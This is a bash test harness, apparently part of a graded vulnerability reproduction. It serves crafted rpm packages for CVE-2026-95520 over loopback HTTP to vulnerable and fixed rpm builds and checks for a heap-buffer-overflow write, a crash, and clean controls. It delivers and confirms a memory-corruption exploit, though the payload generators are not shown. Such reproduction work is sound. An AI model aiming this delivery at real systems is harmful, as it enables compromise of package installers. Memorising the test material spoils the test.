#!/usr/bin/env bash
# Wire lane for CVE-2026-95520: feed the crafted rpm to real rpm over loopback
# HTTP using rpm's own %_urlhelper (curl). The ASan WRITE and the plain fault
# must follow bytes fetched from the wire, with fixed/safe/closed-port controls.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
work=$PWD/wire
serve=$work/serve
mkdir -p "$serve" "$work"

vuln_config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$vuln_config/rpmrc" ] || vuln_config=$root/build-vuln-asan
# Normalize the config string length exactly as the other grade runners do.
cfg_link=$(mktemp -d /tmp/r2s-cfg.XXXXX) || exit 1
rmdir "$cfg_link" || exit 1
ln -s "$vuln_config" "$cfg_link" || exit 1
vuln_config=$cfg_link

vuln_asan=$root/build-vuln-asan/tools/rpm
fixed_asan=$root/build-fixed-asan/tools/rpm
vuln_plain=$root/build-vuln-plain/tools/rpm
for bin in "$vuln_asan" "$fixed_asan" "$vuln_plain"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    [ -e "$p" ] && { echo "REFUSE: $p already exists"; exit 1; }
done
cleanup() {
    [ -n "${server_pid:-}" ] && kill "$server_pid" 2>/dev/null
    [ -n "${server_pid:-}" ] && wait "$server_pid" 2>/dev/null
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh /tmp/mydir/.keep
    rmdir /tmp/mydir 2>/dev/null || true
    rm -f "$cfg_link"
}
trap cleanup EXIT
fresh() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
    rm -rf "$work/db"
    mkdir -p "$work/db"
}

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

python3 make-attack.py safe.rpm attack.rpm safe-newc.rpm > make-attack.log || exit 1
python3 relocate-install.py > "$work/generate.log" || { cat "$work/generate.log"; exit 1; }
for fixture in attack-reloc.rpm attack-zero-reloc.rpm safe-reloc.rpm short-read-reloc.rpm; do
    cp "install/$fixture" "$serve/$fixture" || exit 1
    sha256sum "install/$fixture" >> "$work/fixtures.sha256"
done

: > "$work/port"
python3 "$work/http_server.py" "$serve" "$work/port" > "$work/server.log" 2>&1 &
server_pid=$!
for _ in $(seq 1 100); do
    [ -s "$work/port" ] && break
    sleep 0.1
done
port=$(cat "$work/port" 2>/dev/null || true)
case "$port" in ''|*[!0-9]*) echo "NO LOOPBACK SERVER"; cat "$work/server.log"; exit 1;; esac
echo "SERVER http://127.0.0.1:$port/ pid=$server_pid"
curl --silent --show-error --fail --noproxy '*' \
    "http://127.0.0.1:$port/attack-reloc.rpm" -o /dev/null || exit 1

# The closed-port control uses a port that was bound and released before the
# server started, so no listener should answer there.
closed_port=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')

expect_rc() {
    # name expected config binary url asan(0|1)
    local name=$1 want=$2 cfg=$3 bin=$4 url=$5 asan=$6
    fresh
    local -a envargs=(RPM_CONFIGDIR="$cfg" NO_PROXY='*' no_proxy='*')
    if [ "$asan" -eq 1 ]; then
        envargs+=(ASAN_OPTIONS=detect_leaks=0:abort_on_error=1)
    fi
    env "${envargs[@]}" "$bin" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$url" > "$work/$name.log" 2>&1
    local rc=$?
    printf '%s\n' "$rc" > "$work/$name.log.rc"
    if [ "$rc" -eq "$want" ]; then
        ok "$name rc=$rc"
    else
        bad "$name rc=$rc want=$want"
    fi
}

base=http://127.0.0.1:$port
expect_rc asan-vuln-attack 134 "$vuln_config" "$vuln_asan" "$base/attack-reloc.rpm" 1
expect_rc asan-fixed-attack 1 "$fixed_config" "$fixed_asan" "$base/attack-reloc.rpm" 1
expect_rc asan-vuln-safe 1 "$vuln_config" "$vuln_asan" "$base/safe-reloc.rpm" 1
expect_rc plain-vuln-attack 139 "$vuln_config" "$vuln_plain" "$base/attack-reloc.rpm" 0
expect_rc plain-vuln-zero 1 "$vuln_config" "$vuln_plain" "$base/attack-zero-reloc.rpm" 0
expect_rc plain-vuln-short 1 "$vuln_config" "$vuln_plain" "$base/short-read-reloc.rpm" 0
expect_rc closed-port-attack 1 "$vuln_config" "$vuln_asan" \
    "http://127.0.0.1:$closed_port/attack-reloc.rpm" 1

if grep -q 'AddressSanitizer: heap-buffer-overflow' "$work/asan-vuln-attack.log" && \
   grep -q 'WRITE of size 64' "$work/asan-vuln-attack.log" && \
   grep -q 'iterReadArchiveNext' "$work/asan-vuln-attack.log" && \
   grep -q 'rpmfi.cc:2242' "$work/asan-vuln-attack.log"; then
    ok 'wire asan-vuln-attack: WRITE size 64 in iterReadArchiveNext at rpmfi.cc:2242'
else
    bad 'wire asan-vuln-attack report missing expected ASan frames'
fi
if ! grep -q AddressSanitizer "$work/asan-fixed-attack.log"; then
    ok 'wire asan-fixed-attack ASan-clean'
else
    bad 'wire asan-fixed-attack has an ASan report'
fi
if ! grep -q AddressSanitizer "$work/asan-vuln-safe.log"; then
    ok 'wire asan-vuln-safe ASan-clean'
else
    bad 'wire asan-vuln-safe has an ASan report'
fi
if ! grep -q AddressSanitizer "$work/closed-port-attack.log"; then
    ok 'closed-port-attack ASan-clean (no bytes fetched)'
else
    bad 'closed-port-attack has an ASan report'
fi
if grep -q 'GET /attack-reloc.rpm' "$work/server.log" && \
   grep -q 'GET /safe-reloc.rpm' "$work/server.log" && \
   grep -q 'GET /attack-zero-reloc.rpm' "$work/server.log" && \
   grep -q 'GET /short-read-reloc.rpm' "$work/server.log"; then
    ok 'server log records GET for all four fixtures'
else
    bad 'server log missing a fixture GET'
fi

echo "WIRE_CONSUMER_PASS=$pass WIRE_CONSUMER_FAIL=$fail"
[ "$fail" -eq 0 ]
